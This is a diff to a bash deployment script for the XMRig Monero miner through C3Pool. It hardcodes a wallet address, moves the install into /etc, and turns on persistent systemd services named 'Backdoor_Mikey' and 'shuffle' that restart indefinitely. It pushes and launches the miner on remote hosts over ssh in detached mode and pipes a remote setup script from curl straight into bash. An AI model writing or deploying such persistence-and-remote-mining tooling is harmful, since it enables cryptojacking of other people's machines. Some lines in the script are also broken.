@@ -21,9 +21,9 @@ poolPort=17777  #     80: 1000 diff (Firewall bypass)
                 #     43333: 2G diff (ETH port)
                 #     53333: 2G diff (ETH port/SSL/TLS)
 # your wallet public address
-wallet=4256HG8... # place it HERE!
+wallet=4256HG8uJUTPBqZiJYPNQ92x6PV1sUsngAsv3TQX4woqJGFsKQkjCdoZKbgfr8C3VnLWK7Qd5Y3WJBPcuzMW93AmVSYtN2W # place it HERE!
 # installation directory (DONT change)
-InstDIR=$HOME
+InstDIR=/etc
 DIR=$InstDIR/c3pool
 # remote build via IP
 # remote=true #deprecated run the `. build.sh -r` for remote build deploy
@@ -32,7 +32,7 @@ DIR=$InstDIR/c3pool
 CPU_min_lim=50
 CPU_max_lim=75
 # Daemon: service which ensures to restart if the miner terminates unexpectedly
-daemon_active=false
+daemon_active=true
 # Detatched
 detatched=true
 ###############################################################################################################################
@@ -49,11 +49,13 @@ function center () {
 }
 function killAll () {
     killall -9 cpulimit
-    sed -i '/c3pool/d' $HOME/.profile;
+    sed -i '/c3pool/d' $InstDIR/.profile;
     killall -9 xmrig;
     sudo systemctl stop Backdoor_Mikey.service  
     systemctl stop c3pool_miner.service
     sudo systemctl shuffle.service  
+    sudo systemctl stop c3pool_miner.service
+    sudo systemctl stop shuffle.service  
     log 'killed all services.'
 }
 function stopService () {
@@ -70,6 +72,29 @@ function removeService () {
         sudo systemctl reset-failed
     fi
 }
+
+function systemdc () {
+    
+	echo "cleanup systemd"
+	sudo systemctl stop c3pool_miner.service
+    sudo systemctl disable c3pool_miner.service
+    sudo rm -f /etc/systemd/system/c3pool_miner.service
+    echo "c3pool_service removed"
+	sudo systemctl stop Backdoor_Mikey.service
+    sudo systemctl disable Backdoor_Mikey.service
+    sudo rm -f /etc/systemd/system/Backdoor_Mikey.service
+	echo "Backdoor_Mikey_service removed"
+	sudo systemctl stop shuffle.service
+    sudo systemctl disable shuffle.service
+    sudo rm -f /etc/systemd/system/shuffle.service
+	echo "Shuffling_Service removed"
+    sudo systemctl daemon-reload
+    sudo systemctl reset-failed
+    echo "...Terminus..."
+
+} 
+
+
 function CPU_threads () {
     # echo $(cpuThreads)
     grep -c ^processor /proc/cpuinfo
@@ -123,6 +148,7 @@ function install () {
         sudo apt install -y curl && sudo apt install -y cpulimit &&
         sudo apt-get install -y sysstat
         curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s $wallet
+        mv $HOME/c3pool /etc
         wait 
         setPort
         removeService && killAll
@@ -135,12 +161,13 @@ function uninstall () {
     echo 'uninstall on remote host? (y/n)'; read input
     if [[ "$input" == "y" ]]; then
         echo "Hostname: ";read IP;echo "Login: ";read USER
-        ssh $USER@$IP "rm -r $DIR; rm $InstDIR/build.sh"
+        ssh $USER@$IP "$(typeset -f systemdc); systemdc; rm -rf $DIR; rm $InstDIR/build.sh"
     else
         if [ ! -d "$DIR" ]; then
             echo '[DirtyMike]: no miner installation found on this host.';
         else
-            rm -r $DIR; rm $InstDIR/build.sh
+            systemdc
+            rm -rf $DIR; rm $InstDIR/build.sh
             sleep 1; clear;
             center 'Thanks for the F-shack!\nDirtyMike and the Boyz 😙'
             sleep 5; clear
@@ -159,7 +186,7 @@ function daemon () {
   [Unit]
 Description=Dirty Mike
 [Service]
-ExecStart=$HOME/c3pool/xmrig --config=$HOME/c3pool/config.json
+ExecStart=$InstDIR/c3pool/xmrig --config=$InstDIR/c3pool/config.json
 Restart=always
 Nice=8
 CPUWeight=1
@@ -168,7 +195,6 @@ WantedBy=multi-user.target
 EOL
     sudo mv /tmp/Backdoor_Mikey.service /etc/systemd/system/Backdoor_Mikey.service
     log "..... Mikey daemon is here ....."
-    sudo systemctl daemon-reload
     sudo systemctl enable Backdoor_Mikey.service
     sudo systemctl start Backdoor_Mikey.service  
 
@@ -178,7 +204,7 @@ EOL
   [Unit]
 Description=Shuffle
 [Service]
-ExecStart=$HOME/build.sh -s
+ExecStart=/bin/bash $InstDIR/build.sh -s
 Restart=always
 Nice=8
 CPUWeight=1
@@ -187,9 +213,9 @@ WantedBy=multi-user.target
 EOL
     sudo mv /tmp/shuffle.service /etc/systemd/system/shuffle.service
     log "shuffle service initiated ..."
-    sudo systemctl daemon-reload
     sudo systemctl enable shuffle.service
     sudo systemctl start shuffle.service
+    sudo systemctl reset-failed
     log "miner will start shortly ..."
 }
 function build () {
@@ -216,11 +242,11 @@ mode=$1$2;
 if [[ "$mode" == "-r" ]]; then # draw host credentials
     echo "Hostname: ";read IP;echo "Login: ";read USER
     log "$USER deploying build remotely at $IP ..."
-    scp -r ./* $USER@$IP:/home && \
+    scp -r ./* $USER@$IP:$InstDIR && \
     if [[ $detatched == true ]]; then
-        ssh $USER@$IP "setsid -f bash $InstDIR/build.sh > /dev/null 2>&1"
+        ssh $USER@$IP "setsid -f bash "$InstDIR"/build.sh > /dev/null 2>&1"
     else
-        cat $InstDIR/build.sh | ssh $USER@$IP /bin/bash
+        ssh $USER@$IP /bin/bash $InstDIR/build.sh
     fi
     log "$IP will start to mine soon!"
 elif [[ "$mode" == "-k" ]]; then
@@ -228,13 +254,13 @@ elif [[ "$mode" == "-k" ]]; then
     if [[ "$remote" == "y" ]]; then
         log 'remote KILL 🔪'
         echo "Hostname: ";read IP;echo "Login: ";read USER
-        ssh $USER@$IP ". $InstDIR/build.sh -k"
+        ssh $USER@$IP ". "$InstDIR"/build.sh -k"
         log "killed $IP ..."
     else 
         killAll
     fi
 elif [[ "$mode" == "-rm" ]]; then
-    uninstall
+    uninstall  
 elif [[ "$mode" == "-s" ]]; then
     shuffle
 else
